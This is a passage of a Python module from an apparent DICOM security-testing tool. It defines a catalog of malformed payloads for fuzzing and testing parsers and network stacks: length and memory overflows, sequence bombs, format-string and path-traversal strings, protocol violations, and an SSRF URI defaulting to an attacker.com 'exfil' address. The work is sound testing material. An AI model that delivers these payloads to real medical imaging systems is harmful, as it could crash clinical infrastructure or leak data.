# SPDX-License-Identifier: GPL-2.0-only
"""
C-SCARE Attack Catalog - static DICOM security test payloads

This module is a STATIC CATALOG of hand-built malformed DICOM payloads. It
is not a fuzzing engine: there is no mutation loop and no coverage feedback.
The catalog has two roles in C-SCARE:
  * Black-box DAST  - deliver payloads live at a target and watch for
                      anomalies (see c_scare.deliver / test_runner).
  * Grey-box seeds  - write payloads to disk as the initial corpus for
                      AFL++ / AFLNet, which own the actual mutation loop.

Pre-built attack patterns derived from:
1. DICOM protocol specification edge cases
2. Real-world CVEs (2019-2024)
3. Fuzzer test cases

Attack Categories:
    ParserAttacks      - Target DICOM file/dataset parsers
    ProtocolAttacks    - Target network stack (PDUs, associations)
    MemoryAttacks      - Buffer overflows, allocation exhaustion
    LogicAttacks       - Semantic confusion, state violations
    CommandInjectionAttacks - Shell injection via storescp exec placeholders
    StateMachineAttacks - DICOM state machine (Sta1-Sta13) violations
    CVEAttacks         - CVE-specific reproductions

CVE Coverage:
    CVE-2023-32135  - Use-After-Free in DCM parsing
    CVE-2024-24793  - Use-After-Free in File Meta Info
    CVE-2024-24794  - Use-After-Free in Sequence parsing
    CVE-2024-33606  - SSRF via URI Value Representation
    CVE-2019-11687  - Executable embedding (PEDICOM/ELFDICOM)
    CVE-2024-22100  - Heap-based buffer overflow
    CVE-2024-25578  - Out-of-bounds write
    CVE-2024-28877  - Stack-based buffer overflow

Example:
    from c_scare.attacks import ParserAttacks, CVEAttacks, ProtocolSeedGenerator
    
    # Generate test corpus
    corpus = ParserAttacks.generate_corpus('/output', count=100)
    
    # CVE-specific tests
    for attack in CVEAttacks.cve_2024_24793_duplicate_meta_tags():
        test_target(attack.payload)
    
    # Seed an AFL++/AFLNet corpus (the engines own the mutation loop)
    for result in ProtocolSeedGenerator.all(count=100):
        save_seed(result.payload)
"""

from dataclasses import dataclass, field
from typing import Any, Dict, Generator, List, Optional, Tuple, Union
import random
import struct
import socket
import os
import time

from .element import Element, Dataset, Tag, VR
from .corruptor import Corruptor, Override, Injection, InjectionPoint
from .pixel import EncapsulatedPixelData, Fragment
from .file import DicomFile

# Scapy imports - may not be available in all environments
try:
    from .scapy_dicom import (
        DICOM, A_ASSOCIATE_RQ, A_ASSOCIATE_AC, A_ASSOCIATE_RJ,
        P_DATA_TF, A_RELEASE_RQ, A_RELEASE_RP, A_ABORT,
        C_ECHO_RQ, C_ECHO_RSP, C_STORE_RQ, C_FIND_RQ, C_MOVE_RQ,
        PresentationDataValueItem, DICOMSocket,
        DICOMVariableItem, DICOMApplicationContext, DICOMUserInformation,
        DICOMPresentationContextRQ, DICOMAbstractSyntax, DICOMTransferSyntax,
        DICOMMaximumLength, DICOMImplementationClassUID,
        build_presentation_context_rq, build_user_information,
        DEFAULT_TRANSFER_SYNTAX_UID, VERIFICATION_SOP_CLASS_UID,
        CT_IMAGE_STORAGE_SOP_CLASS_UID, IMPLEMENTATION_CLASS_UID,
        MR_IMAGE_STORAGE_SOP_CLASS_UID, SECONDARY_CAPTURE_SOP_CLASS_UID,
        _uid_to_bytes,
    )
    SCAPY_DICOM_AVAILABLE = True
except Exception:
    SCAPY_DICOM_AVAILABLE = False
    DEFAULT_TRANSFER_SYNTAX_UID = '1.2.840.10008.1.2'
    VERIFICATION_SOP_CLASS_UID = '1.2.840.10008.1.1'
    CT_IMAGE_STORAGE_SOP_CLASS_UID = '1.2.840.10008.5.1.4.1.1.2'
    MR_IMAGE_STORAGE_SOP_CLASS_UID = '1.2.840.10008.5.1.4.1.1.4'
    SECONDARY_CAPTURE_SOP_CLASS_UID = '1.2.840.10008.5.1.4.1.1.7'
    IMPLEMENTATION_CLASS_UID = '1.2.3.4.5.6.7.8.9'

try:
    from scapy.packet import raw, fuzz, Packet
    from scapy.volatile import RandByte, RandShort, RandInt, RandString
    SCAPY_PACKET_AVAILABLE = True
except Exception:
    SCAPY_PACKET_AVAILABLE = False
    raw = bytes
    def fuzz(pkt): return pkt

SCAPY_AVAILABLE = SCAPY_DICOM_AVAILABLE and SCAPY_PACKET_AVAILABLE

__all__ = [
    'AttackResult',
    # Attack pattern classes
    'ParserAttacks',
    'ProtocolAttacks',
    'MemoryAttacks',
    'LogicAttacks',
    'CommandInjectionAttacks',
    'StateMachineAttacks',
    'CVEAttacks',
    # Seed generators (corpus emitters for AFL++/AFLNet; not fuzzing engines)
    'ProtocolSeedGenerator',
    'TargetedSeedGenerator',
    'CombinedAttacks',
    # Deprecated aliases
    'ProtocolFuzzer',
    'TargetedFuzzer',
]


@dataclass
class AttackResult:
    """Result of an attack test."""
    name: str
    category: str
    payload: bytes
    description: str
    expected_behavior: str
    metadata: Dict[str, Any] = field(default_factory=dict)
    response: Optional[bytes] = None
    success: Optional[bool] = None
    monitor_reports: List[Any] = field(default_factory=list)

    @property
    def cve(self) -> Optional[str]:
        """Get CVE reference if present."""
        return self.metadata.get('cve')


# =============================================================================
# Parser Attacks - Target DICOM file/dataset parsers
# =============================================================================

class ParserAttacks:
    """
    Attacks targeting DICOM parsers (viewers, PACS, libraries).
    
    These generate malformed DICOM files/datasets that may crash or
    confuse parsers.
    """
    
    @staticmethod
    def invalid_vr(vr: str = 'XX') -> AttackResult:
        """Element with invalid VR code."""
        ds = Dataset() / Element.raw(
            tag=0x00100010,
            vr=vr,
            value=b'Test^Patient'
        )
        return AttackResult(
            name='invalid_vr',
            category='parser',
            payload=ds.encode(),
            description=f'PatientName with invalid VR "{vr}"',
            expected_behavior='Parser should reject or handle gracefully',
            metadata={'vr': vr}
        )
    
    @staticmethod
    def length_overflow(declared: int = 0xFFFFFFFF, actual: int = 10) -> AttackResult:
        """Length field larger than actual data."""
        ds = Dataset() / Element.raw(
            tag=0x00100010,
            vr='PN',
            length=declared,
            value=b'X' * actual
        )
        return AttackResult(
            name='length_overflow',
            category='parser',
            payload=ds.encode(),
            description=f'Declared length {declared:#x}, actual {actual}',
            expected_behavior='Parser should detect length mismatch',
            metadata={'declared': declared, 'actual': actual}
        )
    
    @staticmethod
    def length_underflow(declared: int = 1, actual: int = 1000) -> AttackResult:
        """Length field smaller than actual data."""
        ds = Dataset() / Element.raw(
            tag=0x00100010,
            vr='PN',
            length=declared,
            value=b'X' * actual
        )
        return AttackResult(
            name='length_underflow',
            category='parser',
            payload=ds.encode(),
            description=f'Declared length {declared}, actual {actual}',
            expected_behavior='Parser may read beyond declared boundary',
            metadata={'declared': declared, 'actual': actual}
        )
    
    @staticmethod
    def undefined_length_abuse() -> AttackResult:
        """Undefined length without proper delimitation."""
        data = struct.pack('<HH', 0x0010, 0x0010)  # Tag
        data += b'LO'  # VR
        data += b'\x00\x00'  # Reserved
        data += struct.pack('<I', 0xFFFFFFFF)  # Undefined length
        data += b'AAAA' * 100  # Data without delimiter
        
        return AttackResult(
            name='undefined_length_abuse',
            category='parser',
            payload=data,
            description='Undefined length without sequence delimiter',
            expected_behavior='Parser should timeout or reject',
        )
    
    @staticmethod
    def sequence_bomb(depth: int = 500) -> AttackResult:
        """Deeply nested sequences (stack overflow attempt)."""
        data = b''
        for _ in range(depth):
            data += struct.pack('<HH', 0x0040, 0xA730)  # Content Sequence
            data += b'SQ'
            data += b'\x00\x00'
            data += struct.pack('<I', 0xFFFFFFFF)  # Undefined length
            data += struct.pack('<HH', 0xFFFE, 0xE000)  # Item tag
            data += struct.pack('<I', 0xFFFFFFFF)  # Undefined length
        
        for _ in range(depth):
            data += struct.pack('<HH', 0xFFFE, 0xE00D)  # Item delim
            data += struct.pack('<I', 0)
            data += struct.pack('<HH', 0xFFFE, 0xE0DD)  # Sequence delim
            data += struct.pack('<I', 0)
        
        return AttackResult(
            name='sequence_bomb',
            category='parser',
            payload=data,
            description=f'Sequence nested {depth} levels deep',
            expected_behavior='Parser may stack overflow or hang',
            metadata={'depth': depth, 'cve': 'CVE-2024-28877'}
        )
    
    @staticmethod
    def tag_out_of_order() -> AttackResult:
        """Tags not in ascending order."""
        ds = Dataset()
        ds._force_append(Element(0x0020, 0x000D, 'UI', '1.2.3'))  # Study UID
        ds._force_append(Element(0x0010, 0x0010, 'PN', 'Doe^John'))  # Patient Name
        
        return AttackResult(
            name='tag_out_of_order',
            category='parser',
            payload=ds.encode(),
            description='Tags in descending order',
            expected_behavior='Parser should reject or sort',
        )
    
    @staticmethod
    def duplicate_tag() -> AttackResult:
        """Same tag appears twice. CVE-2024-24793 variant."""
        ds = Dataset()
        ds._force_append(Element(0x0010, 0x0010, 'PN', 'Doe^John'))
        ds._force_append(Element(0x0010, 0x0010, 'PN', 'Evil^Patient'))
        
        return AttackResult(
            name='duplicate_tag',
            category='parser',
            payload=ds.encode(),
            description='PatientName appears twice',
            expected_behavior='Parser behavior undefined - may use either',
            metadata={'cve': 'CVE-2024-24793'}
        )
    
    @staticmethod
    def null_in_string() -> AttackResult:
        """Null bytes embedded in string value."""
        ds = Dataset() / Element(0x0010, 0x0010, 'PN', 'Doe\x00^John\x00\x00')
        
        return AttackResult(
            name='null_in_string',
            category='parser',
            payload=ds.encode(),
            description='Null bytes in PatientName',
            expected_behavior='Parser may truncate or include nulls',
        )
    
    @staticmethod
    def format_string_injection() -> AttackResult:
        """Format string patterns in string VR. CVE-2024-28877 variant."""
        ds = Dataset()
        ds = ds / Element(0x0008, 0x1030, 'LO', '%s%s%s%s%s%s%s%s%n')  # Study Description
        ds = ds / Element(0x0010, 0x0010, 'PN', '%x%x%x%x%x%x%x%x')  # Patient Name
        
        return AttackResult(
            name='format_string_injection',
            category='parser',
            payload=ds.encode(),
            description='Format string patterns in string tags',
            expected_behavior='Parser should not interpret as format strings',
            metadata={'cve': 'CVE-2024-28877'}
        )
    
    @staticmethod
    def path_traversal_in_string() -> AttackResult:
        """Path traversal patterns in string VR."""
        ds = Dataset()
        ds = ds / Element(0x0008, 0x1010, 'SH', '../../../etc/passwd')  # Station Name
        ds = ds / Element(0x0010, 0x0010, 'PN', '..\\..\\..\\Windows\\System32')
        
        return AttackResult(
            name='path_traversal_in_string',
            category='parser',
            payload=ds.encode(),
            description='Path traversal sequences in string tags',
            expected_behavior='Parser should sanitize paths',
            metadata={'cve': 'CVE-2024-28877'}
        )
    
    @staticmethod
    def unicode_expansion() -> AttackResult:
        """Short UTF-8 that expands to long UTF-16."""
        # UTF-8 sequences that expand significantly
        value = '\u0100' * 1000  # Each char is 2 bytes UTF-8, 2 bytes UTF-16
        ds = Dataset() / Element(0x0010, 0x0010, 'PN', value)
        
        return AttackResult(
            name='unicode_expansion',
            category='parser',
            payload=ds.encode(),
            description='Unicode that may expand during conversion',
            expected_behavior='Parser should handle encoding safely',
            metadata={'cve': 'CVE-2024-28877'}
        )
    
    @staticmethod
    def generate_corpus(output_dir: str, count: int = 100) -> List[AttackResult]:
        """Generate fuzzing corpus of malformed DICOM files."""
        os.makedirs(output_dir, exist_ok=True)
        results = []
        
        attacks = [
            ('invalid_vr_XX', lambda: ParserAttacks.invalid_vr('XX')),
            ('invalid_vr_00', lambda: ParserAttacks.invalid_vr('\x00\x00')),
            ('length_overflow', lambda: ParserAttacks.length_overflow()),
            ('length_underflow', lambda: ParserAttacks.length_underflow()),
            ('undefined_length', ParserAttacks.undefined_length_abuse),
            ('sequence_bomb_10', lambda: ParserAttacks.sequence_bomb(10)),
            ('sequence_bomb_100', lambda: ParserAttacks.sequence_bomb(100)),
            ('tag_out_of_order', ParserAttacks.tag_out_of_order),
            ('duplicate_tag', ParserAttacks.duplicate_tag),
            ('null_in_string', ParserAttacks.null_in_string),
            ('format_string', ParserAttacks.format_string_injection),
            ('path_traversal', ParserAttacks.path_traversal_in_string),
        ]
        
        for name, attack_fn in attacks:
            if len(results) >= count:
                break
            result = attack_fn()
            filepath = os.path.join(output_dir, f'{name}.dcm')
            
            file_data = b'\x00' * 128 + b'DICM' + result.payload
            
            with open(filepath, 'wb') as f:
                f.write(file_data)
            
            result.metadata['filepath'] = filepath
            results.append(result)
        
        return results

    @classmethod
    def all(cls) -> Generator[AttackResult, None, None]:
        """Yield every parser attack payload."""
        yield cls.invalid_vr()
        yield cls.length_overflow()
        yield cls.length_underflow()
        yield cls.undefined_length_abuse()
        yield cls.sequence_bomb()
        yield cls.tag_out_of_order()
        yield cls.duplicate_tag()
        yield cls.null_in_string()
        yield cls.format_string_injection()
        yield cls.path_traversal_in_string()
        yield cls.unicode_expansion()


# =============================================================================
# Protocol Attacks - Target DICOM network stack
# =============================================================================

class ProtocolAttacks:
    """
    Attacks targeting DICOM network protocol.

    Uses Scapy packets for full protocol control when available.
    All methods return AttackResult for a uniform interface.
    """

    @staticmethod
    def malformed_protocol_version(version: int = 0xFFFF) -> AttackResult:
        """A-ASSOCIATE-RQ with invalid protocol version."""
        if not SCAPY_AVAILABLE:
            payload = b'\x01\x00' + struct.pack('!I', 68) + struct.pack('!H', version) + b'\x00' * 66
        else:
            pkt = DICOM() / A_ASSOCIATE_RQ(
                protocol_version=version,
                called_ae_title='TARGET',
                calling_ae_title='ATTACKER',
            )
            payload = raw(pkt)
        return AttackResult(
            name='malformed_protocol_version',
            category='protocol',
            payload=payload,
            description=f'A-ASSOCIATE-RQ with protocol version {version:#x}',
            expected_behavior='Target should reject invalid version',
            metadata={'version': version},
        )

    @staticmethod
    def oversized_pdu(size: int = 0x100000) -> AttackResult:
        """PDU with declared length far exceeding data."""
        header = struct.pack('!BBL', 0x01, 0x00, size)
        body = b'X' * 100
        payload = header + body
        return AttackResult(
            name='oversized_pdu',
            category='protocol',
            payload=payload,
            description=f'PDU declares {size:#x} bytes, only 100 present',
            expected_behavior='Target should detect length mismatch',
            metadata={'declared_size': size},
        )

    @staticmethod
    def undersized_pdu() -> AttackResult:
        """PDU with declared length smaller than data."""
        header = struct.pack('!BBL', 0x01, 0x00, 10)
        body = b'X' * 1000
        payload = header + body
        return AttackResult(
            name='undersized_pdu',
            category='protocol',
            payload=payload,
            description='PDU declares 10 bytes, 1000 present',
            expected_behavior='Target should detect length mismatch',
        )

    @staticmethod
    def invalid_pdu_type(pdu_type: int = 0xFF) -> AttackResult:
        """PDU with unknown type code."""
        payload = struct.pack('!BBL', pdu_type, 0x00, 4) + b'\x00' * 4
        return AttackResult(
            name='invalid_pdu_type',
            category='protocol',
            payload=payload,
            description=f'PDU with unknown type {pdu_type:#x}',
            expected_behavior='Target should reject unknown PDU type',
            metadata={'pdu_type': pdu_type},
        )

    @staticmethod
    def truncated_association() -> AttackResult:
        """A-ASSOCIATE-RQ truncated mid-packet."""
        if not SCAPY_AVAILABLE:
            full = b'\x01\x00' + struct.pack('!I', 68) + b'\x00' * 68
        else:
            pkt = DICOM() / A_ASSOCIATE_RQ()
            full = raw(pkt)
        payload = full[:len(full) // 2]
        return AttackResult(
            name='truncated_association',
            category='protocol',
            payload=payload,
            description='A-ASSOCIATE-RQ truncated mid-packet',
            expected_behavior='Target should handle incomplete PDU',
        )

    @staticmethod
    def pdata_without_association() -> AttackResult:
        """P-DATA-TF sent without prior association."""
        if not SCAPY_AVAILABLE:
            payload = b'\x04\x00' + struct.pack('!I', 20) + b'\x00' * 20
        else:
            cmd = C_ECHO_RQ(message_id=1)
            pdv = PresentationDataValueItem(
                context_id=1,
                is_last=1, is_command=1,
                data=raw(cmd),
            )
            pkt = DICOM() / P_DATA_TF(pdv_items=[pdv])
            payload = raw(pkt)
        return AttackResult(
            name='pdata_without_association',
            category='protocol',
            payload=payload,
            description='P-DATA-TF without prior association',
            expected_behavior='Target should abort or ignore',
        )

    @staticmethod
    def double_association() -> AttackResult:
        """Two A-ASSOCIATE-RQ packets (second should fail)."""
        if not SCAPY_AVAILABLE:
            pdu = b'\x01\x00' + struct.pack('!I', 68) + b'\x00' * 68
            pdu1, pdu2 = pdu, pdu
        else:
            pkt = DICOM() / A_ASSOCIATE_RQ(
                called_ae_title='TARGET',
                calling_ae_title='ATTACKER',
            )
            pdu1, pdu2 = raw(pkt), raw(pkt)
        return AttackResult(
            name='double_association',
            category='protocol',
            payload=pdu1 + pdu2,
            description='Two A-ASSOCIATE-RQ packets (second should fail)',
            expected_behavior='Target should reject second association',
            metadata={'steps': [pdu1, pdu2]},
        )

    @staticmethod
    def overlong_ae_title() -> AttackResult:
        """A-ASSOCIATE-RQ with AE title > 16 chars."""
        if not SCAPY_AVAILABLE:
            payload = b'\x01\x00' + struct.pack('!I', 68) + b'X' * 20 + b'\x00' * 48
        else:
            pkt = DICOM() / A_ASSOCIATE_RQ(
                called_ae_title=b'X' * 20,  # Should be max 16
                calling_ae_title='ATTACKER',
            )
            payload = raw(pkt)
        return AttackResult(
            name='overlong_ae_title',
            category='protocol',
            payload=payload,
            description='A-ASSOCIATE-RQ with AE title > 16 chars',
            expected_behavior='Target should reject overlong AE title',
        )

    @staticmethod
    def null_ae_titles() -> AttackResult:
        """A-ASSOCIATE-RQ with null AE titles."""
        if not SCAPY_AVAILABLE:
            payload = b'\x01\x00' + struct.pack('!I', 68) + b'\x00' * 32 + b'\x00' * 36
        else:
            pkt = DICOM() / A_ASSOCIATE_RQ(
                called_ae_title=b'\x00' * 16,
                calling_ae_title=b'\x00' * 16,
            )
            payload = raw(pkt)
        return AttackResult(
            name='null_ae_titles',
            category='protocol',
            payload=payload,
            description='A-ASSOCIATE-RQ with null AE titles',
            expected_behavior='Target should reject null AE titles',
        )

    @staticmethod
    def missing_application_context() -> AttackResult:
        """A-ASSOCIATE-RQ without Application Context item."""
        if not SCAPY_AVAILABLE:
            payload = b'\x01\x00' + struct.pack('!I', 68) + b'\x00' * 68
        else:
            variable_items = [
                build_presentation_context_rq(1, VERIFICATION_SOP_CLASS_UID, [DEFAULT_TRANSFER_SYNTAX_UID]),
                build_user_information(max_pdu_length=16384),
            ]
            pkt = DICOM() / A_ASSOCIATE_RQ(
                called_ae_title='TARGET',
                calling_ae_title='ATTACKER',
                variable_items=variable_items,
            )
            payload = raw(pkt)
        return AttackResult(
            name='missing_application_context',
            category='protocol',
            payload=payload,
            description='A-ASSOCIATE-RQ without Application Context',
            expected_behavior='Target should reject missing context',
        )

    @staticmethod
    def pdu_length_mismatch(inflate_by: int = 10000) -> AttackResult:
        """A-ASSOCIATE-RQ with length field inflated."""
        if not SCAPY_AVAILABLE:
            pdu = b'\x01\x00' + struct.pack('!I', 68) + b'\x00' * 68
        else:
            pkt = DICOM() / A_ASSOCIATE_RQ()
            pdu = raw(pkt)

        actual_len = struct.unpack('!I', pdu[2:6])[0]
        payload = pdu[:2] + struct.pack('!I', actual_len + inflate_by) + pdu[6:]
        return AttackResult(
            name='pdu_length_mismatch',
            category='protocol',
            payload=payload,
            description=f'PDU length inflated by {inflate_by}',
            expected_behavior='Target should detect length mismatch',
            metadata={'inflate_by': inflate_by},
        )

    @staticmethod
    def abort_injection() -> AttackResult:
        """A-ABORT packet for injecting mid-session."""
        if not SCAPY_AVAILABLE:
            payload = b'\x07\x00' + struct.pack('!I', 4) + b'\x00\x00\x00\x00'
        else:
            pkt = DICOM() / A_ABORT(source=0, reason_diag=0)
            payload = raw(pkt)
        return AttackResult(
            name='abort_injection',
            category='protocol',
            payload=payload,
            description='A-ABORT packet for mid-session injection',
            expected_behavior='Target should handle abort cleanly',
        )

    @staticmethod
    def wrong_context_id(context_id: int = 255) -> AttackResult:
        """P-DATA-TF with non-negotiated context ID."""
        if not SCAPY_AVAILABLE:
            payload = b'\x04\x00' + struct.pack('!I', 20) + bytes([context_id]) + b'\x00' * 19
        else:
            cmd = C_ECHO_RQ(message_id=1)
            pdv = PresentationDataValueItem(
                context_id=context_id,
                is_last=1, is_command=1,
                data=raw(cmd),
            )
            pkt = DICOM() / P_DATA_TF(pdv_items=[pdv])
            payload = raw(pkt)
        return AttackResult(
            name='wrong_context_id',
            category='protocol',
            payload=payload,
            description=f'P-DATA-TF with context ID {context_id}',
            expected_behavior='Target should reject unknown context',
            metadata={'context_id': context_id},
        )

    @staticmethod
    def invalid_command_field() -> AttackResult:
        """DIMSE command with invalid command field (0xDEAD)."""
        if not SCAPY_AVAILABLE:
            payload = b''
        else:
            cmd = C_STORE_RQ(
                affected_sop_class_uid=CT_IMAGE_STORAGE_SOP_CLASS_UID,
                affected_sop_instance_uid='1.2.3.4.5',
                message_id=1,
            )
            cmd.command_field = 0xDEAD  # Invalid!
            payload = raw(cmd)
        return AttackResult(
            name='invalid_command_field',
            category='protocol',
            payload=payload,
            description='DIMSE command with invalid field 0xDEAD',
            expected_behavior='Target should reject invalid command',
        )

    @classmethod
    def all(cls) -> Generator[AttackResult, None, None]:
        """Yield every protocol attack payload."""
        yield cls.malformed_protocol_version()
        yield cls.oversized_pdu()
        yield cls.undersized_pdu()
        yield cls.invalid_pdu_type()
        yield cls.truncated_association()
        yield cls.pdata_without_association()
        yield cls.double_association()
        yield cls.overlong_ae_title()
        yield cls.null_ae_titles()
        yield cls.missing_application_context()
        yield cls.pdu_length_mismatch()
        yield cls.abort_injection()
        yield cls.wrong_context_id()
        yield cls.invalid_command_field()


# =============================================================================
# Memory Attacks - Buffer overflows, allocation exhaustion
# =============================================================================

class MemoryAttacks:
    """
    Attacks targeting memory handling vulnerabilities.
    
    CVE Coverage:
        CVE-2024-22100 - Heap-based buffer overflow
        CVE-2024-25578 - Out-of-bounds write
        CVE-2024-28877 - Stack-based buffer overflow
    """
    
    @staticmethod
    def pixel_dimension_overflow() -> AttackResult:
        """Rows/Columns set to cause integer overflow."""
        ds = Dataset()
        ds = ds / Element(0x0028, 0x0010, 'US', struct.pack('<H', 0xFFFF))  # Rows
        ds = ds / Element(0x0028, 0x0011, 'US', struct.pack('<H', 0xFFFF))  # Columns
        ds = ds / Element(0x0028, 0x0100, 'US', struct.pack('<H', 32))      # Bits Alloc
        ds = ds / Element(0x7FE0, 0x0010, 'OW', b'\x00' * 100)              # Small pixel data
        
        return AttackResult(
            name='pixel_dimension_overflow',
            category='memory',
            payload=ds.encode(),
            description='65535x65535 pixels with 32-bit allocation',
            expected_behavior='May cause integer overflow in size calc',
            metadata={'cve': 'CVE-2024-22100'}
        )
    
    @staticmethod
    def fragment_count_bomb() -> AttackResult:
        """Encapsulated pixel data with huge number of fragments."""
        pixel = EncapsulatedPixelData(transfer_syntax='1.2.840.10008.1.2.4.50')
        
        for i in range(10000):
            pixel.add_fragment(b'\xFF\xD8\xFF\xE0')
        
        return AttackResult(
            name='fragment_count_bomb',
            category='memory',
            payload=pixel.encode(),
            description='10,000 pixel fragments',
            expected_behavior='May exhaust memory tracking fragments',
            metadata={'cve': 'CVE-2024-22100'}
        )
    
    @staticmethod
    def offset_table_bomb() -> AttackResult:
        """Basic offset table with misleading offsets."""
        num_offsets = 1000
        offset_table = struct.pack('<I', num_offsets * 4)
        for i in range(num_offsets):
            offset_table += struct.pack('<I', (i * 0x10000000) & 0xFFFFFFFF)
        
        data = struct.pack('<HH', 0x7FE0, 0x0010)  # Pixel Data tag
        data += b'OW'
        data += b'\x00\x00'
        data += struct.pack('<I', 0xFFFFFFFF)  # Undefined length
        data += struct.pack('<HH', 0xFFFE, 0xE000)  # Item tag
        data += offset_table
        
        return AttackResult(
            name='offset_table_bomb',
            category='memory',
            payload=data,
            description=f'{num_offsets} fragment offsets pointing to huge addresses',
            expected_behavior='Parser may allocate or seek to huge addresses',
            metadata={'cve': 'CVE-2024-25578'}
        )
    
    @staticmethod
    def value_multiplicity_bomb() -> AttackResult:
        """Element with extreme value multiplicity."""
        value = '\\'.join(['X'] * 100000)
        ds = Dataset() / Element(0x0008, 0x0018, 'UI', value)
        
        return AttackResult(
            name='value_multiplicity_bomb',
            category='memory',
            payload=ds.encode(),
            description='SOP Instance UID with 100,000 values',
            expected_behavior='Parser may allocate huge string array',
            metadata={'cve': 'CVE-2024-22100'}
        )
    
    @staticmethod
    def oversized_string_vr(size: int = 0x10000) -> AttackResult:
        """String VR exceeding normal limits. CVE-2024-22100."""
        ds = Dataset()
        ds = ds / Element(0x0010, 0x0010, 'PN', 'A' * size)  # Patient Name
        
        return AttackResult(
            name='oversized_string_vr',
            category='memory',
            payload=ds.encode(),
            description=f'Patient Name with {size} bytes',
            expected_behavior='Parser should handle or reject gracefully',
            metadata={'cve': 'CVE-2024-22100', 'size': size}
        )
    
    @staticmethod
    def maximum_length_field() -> AttackResult:
        """Element with 0xFFFFFFFF length."""
        ds = Dataset() / Element.raw(
            tag=0x00100010,
            vr='PN',
            length=0xFFFFFFFF,
            value=b'Test'
        )
        
        return AttackResult(
            name='maximum_length_field',
            category='memory',
            payload=ds.encode(),
            description='Element with maximum possible length declaration',
            expected_behavior='Parser should detect impossibility',
            metadata={'cve': 'CVE-2024-22100'}
        )
    
    @staticmethod
    def ob_vr_overflow() -> AttackResult:
        """OB (Other Byte) VR with data exceeding declared length."""
        data = struct.pack('<HH', 0x7FE0, 0x0010)  # Pixel Data
        data += b'OB'
        data += b'\x00\x00'
        data += struct.pack('<I', 100)  # Declare 100 bytes
        data += b'X' * 10000  # But provide 10000
        
        return AttackResult(
            name='ob_vr_overflow',
            category='memory',
            payload=data,
            description='OB value exceeds declared length',
            expected_behavior='Parser should stop at declared length',
            metadata={'cve': 'CVE-2024-25578'}
        )
    
    @staticmethod
    def ow_vr_overflow() -> AttackResult:
        """OW (Other Word) VR with excessive data."""
        data = struct.pack('<HH', 0x7FE0, 0x0010)  # Pixel Data
        data += b'OW'
        data += b'\x00\x00'
        data += struct.pack('<I', 100)  # Declare 100 bytes
        data += b'\x00\xFF' * 5000  # 10000 bytes of 16-bit words
        
        return AttackResult(
            name='ow_vr_overflow',
            category='memory',
            payload=data,
            description='OW value exceeds declared length',
            expected_behavior='Parser should stop at declared length',
            metadata={'cve': 'CVE-2024-25578'}
        )
    
    @staticmethod
    def lut_overflow() -> AttackResult:
        """Lookup Table data exceeding bounds."""
        ds = Dataset()
        # LUT Descriptor: entries, first value, bits stored
        ds = ds / Element(0x0028, 0x1101, 'US', struct.pack('<HHH', 256, 0, 16))
        # LUT Data - way more than 256 entries
        ds = ds / Element(0x0028, 0x1201, 'OW', b'\x00\x01' * 10000)
        
        return AttackResult(
            name='lut_overflow',
            category='memory',
            payload=ds.encode(),
            description='LUT data far exceeds descriptor count',
            expected_behavior='Parser should validate LUT size',
            metadata={'cve': 'CVE-2024-25578'}
        )
    
    @staticmethod
    def encapsulated_frame_overflow() -> AttackResult:
        """JPEG frame with invalid length markers."""
        # Fake JPEG with oversized APP0 marker
        fake_jpeg = b'\xFF\xD8'  # SOI
        fake_jpeg += b'\xFF\xE0'  # APP0
        fake_jpeg += struct.pack('>H', 0xFFFF)  # Maximum segment length
        fake_jpeg += b'JFIF\x00' + b'X' * 100  # Much less than declared
        fake_jpeg += b'\xFF\xD9'  # EOI
        
        pixel = EncapsulatedPixelData(transfer_syntax='1.2.840.10008.1.2.4.50')
        pixel.add_fragment(fake_jpeg)
        
        return AttackResult(
            name='encapsulated_frame_overflow',
            category='memory',
            payload=pixel.encode(),
            description='JPEG with oversized segment length',
            expected_behavior='JPEG decoder should handle gracefully',
            metadata={'cve': 'CVE-2024-25578'}
        )

    @classmethod
    def all(cls) -> Generator[AttackResult, None, None]:
        """Yield every memory attack payload."""
        yield cls.pixel_dimension_overflow()
        yield cls.fragment_count_bomb()
        yield cls.offset_table_bomb()
        yield cls.value_multiplicity_bomb()
        yield cls.oversized_string_vr()
        yield cls.maximum_length_field()
        yield cls.ob_vr_overflow()
        yield cls.ow_vr_overflow()
        yield cls.lut_overflow()
        yield cls.encapsulated_frame_overflow()


# =============================================================================
# Logic Attacks - Semantic confusion, state violations
# =============================================================================

class LogicAttacks:
    """
    Attacks targeting DICOM semantic/logic layer.
    """
    
    @staticmethod
    def transfer_syntax_mismatch() -> AttackResult:
        """File declares one transfer syntax but uses another encoding."""
        meta = Dataset()
        meta / Element(0x0002, 0x0010, 'UI', '1.2.840.10008.1.2.1')  # Explicit LE
        
        # But encode dataset as implicit VR
        data_implicit = struct.pack('<HH', 0x0010, 0x0010)  # Tag only
        data_implicit += struct.pack('<I', 8)
        data_implicit += b'Doe^John'
        
        file_data = b'\x00' * 128 + b'DICM'
        file_data += meta.encode()
        file_data += data_implicit
        
        return AttackResult(
            name='transfer_syntax_mismatch',
            category='logic',
            payload=file_data,
            description='Meta says Explicit VR, data is Implicit VR',
            expected_behavior='Parser should detect encoding mismatch',
        )
    
    @staticmethod
    def sop_class_mismatch() -> AttackResult:
        """SOP Class UID doesn't match actual content."""
        ds = Dataset()
        ds = ds / Element(0x0008, 0x0016, 'UI', CT_IMAGE_STORAGE_SOP_CLASS_UID)
        ds = ds / Element(0x0010, 0x0010, 'PN', 'Doe^John')
        # No actual CT-required elements
        
        return AttackResult(
            name='sop_class_mismatch',
            category='logic',
            payload=ds.encode(),
            description='Claims CT Image but missing CT elements',
            expected_behavior='Validator should reject',
        )
    
    @staticmethod
    def private_creator_missing() -> AttackResult:
        """Private tag without corresponding private creator."""
        ds = Dataset()
        ds = ds / Element(0x0010, 0x0010, 'PN', 'Doe^John')
        ds = ds / Element.raw(tag=0x00091001, vr='LO', value=b'PrivateData')
        
        return AttackResult(
            name='private_creator_missing',
            category='logic',
            payload=ds.encode(),
            description='Private tag (0009,1001) without (0009,0010) creator',
            expected_behavior='Parser may misinterpret VR',
        )
    
    @staticmethod
    def uri_ssrf(url: str = 'http://attacker.com/exfil') -> AttackResult:
        """
        URI injection for SSRF. CVE-2024-33606.
        
        DICOM supports URI-type Value Representations (VR=UR) that some
        viewers may follow without authorization checks.
        """
        ds = Dataset()
        ds = ds / Element(0x0008, 0x1190, 'UR', url)  # Retrieve URI
        
        return AttackResult(
            name='uri_ssrf',
            category='logic',
            payload=ds.encode(),
            description=f'URI tag pointing to {url}',
            expected_behavior='Viewer should not auto-fetch without auth',
            metadata={'cve': 'CVE-2024-33606', 'url': url}
        )
    
    @staticmethod
